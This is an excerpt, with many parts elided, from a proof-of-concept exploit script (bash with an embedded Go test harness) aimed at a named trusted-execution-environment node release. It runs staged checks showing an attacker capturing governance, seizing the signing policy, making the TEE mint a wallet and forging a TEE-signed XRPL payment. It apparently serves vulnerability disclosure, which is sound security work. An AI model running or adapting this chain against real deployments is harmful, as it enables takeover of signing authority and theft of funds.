#!/usr/bin/env bash
# ============================================================================
# ONE-SHOT PoC rev 6 - flare-foundation/tee-node @ v0.0.26
# rev 6: 0b baseline race fixed; D2/D3/D4 checks use result.status (data is hex-encoded);
#        governance verified in-forger; dynamic summary rows
...
func TestPocForger(t *testing.T) {
    ...
    case "xrp-pay-d5":
        require.NotEmpty(t, teeIDHex, "POC_FORGER_TEEID required")
        require.NotEmpty(t, capture, "POC_FORGER_CAPTURE (d5 params) required")
        pb, err := os.ReadFile(capture)
        require.NoError(t, err)
        var d5 struct {
        ...
        require.NoError(t, json.Unmarshal(pb, &d5))
        require.NotEmpty(t, d5.Sender)
        require.NotEmpty(t, d5.Recipient)
        amt, ok := new(big.Int).SetString(d5.Amount, 10)
        require.True(t, ok, "invalid amount")
        voters := keys(t, keysDir, "voter", numVoters)
        cos := keys(t, keysDir, "cosigner", numCosigns)
        cosAddrs := make([]common.Address, len(cos))
        for i, k := range cos {
        ...
        msg := payments.ITeePaymentsPaymentInstructionMessage{
            ...
            SenderAddress:    d5.Sender,
            RecipientAddress: d5.Recipient,
            Amount:           amt,
    ...
    case "verify-xrp":
		...
		var tir types.TeeInfoResponse
		require.NoError(t, json.Unmarshal(resp.Result.Data, &tir))
		expected, err := types.GovernanceHash([]common.Address{common.HexToAddress(os.Getenv("POC_FORGER_GOVADDR"))}, 1)
		require.NoError(t, err)
		require.Equal(t, expected, tir.MachineData.GovernanceHash, "captured governance NOT committed to attested info")
...
if [ "$FORGER_BUILT" != "1" ]; then
  ...
  while :; do
    ...
    if CAPTURE="$WS/teeinfo-attacker.json" forge verify-governance >/dev/null 2>&1; then
      ok "D1 - captured governance is committed into the node's attested info (GovernanceHash verified in-place)"
    else
      info "D1 - governance commitment check failed; inspect forger/01-teeinfo-response.json"
    fi
    ...
    D2ST=$(jqf '.result.status' < "$EV/forger/02-policy-capture-response.json" 2>/dev/null)
    if [ "$D2ST" = "1" ]; then
      ok "D2 - SIGNING POLICY CAPTURED: instruction-verification root of trust now attacker-controlled (status 1)"
      POLICY_ROW="attacker (Phase 6, verified)"
    else
      info "D2 - non-success status ($D2ST); inspect forger/02-policy-capture-response.json"
    fi
    ...
    D3ST=$(jqf '.result.status' < "$EV/forger/03-keygenerate-response.json" 2>/dev/null)
    if [ "$D3ST" = "1" ]; then
      ok "D3 - TEE MINTED A WALLET under the captured policy (key existence proof returned, status 1)"
    else
      info "D3 - non-success status ($D3ST); inspect forger/03-keygenerate-response.json"
    fi
    ...
    for i in $(seq "$R3" $((NEW-1))); do
      b=$(body_at "$i")
      hit=$(echo "$b" | jqf 'select(.result.status == 1) | "yes"' 2>/dev/null)
      if [ "$hit" = "yes" ]; then echo "$b" > "$WS/xrp-captured.json"; FOUND=1; break; fi
    done
    if [ -n "$FOUND" ] && CAPTURE="$WS/xrp-captured.json" forge verify-xrp | tee "$EV/forger/04-verification.txt"; then
      ...
      XRP_ROW="YES, verified (Phase 6)"
    else
      fail "D4 - XRP payment verification failed (see $EV/forger/)"
      XRP_ROW="FAILED (see forger/)"
    fi
    break
  done
fi
...
: "${POLICY_ROW:=NOT RUN (Phase 6 skipped)}"
: "${XRP_ROW:=NOT VERIFIED (Phase 6 incomplete or skipped)}"
...
signing policy                      (uninitialized)     ${POLICY_ROW}
XRPL payment signed by TEE          -                    ${XRP_ROW}
EOF
cat "$EV/SUMMARY.txt"
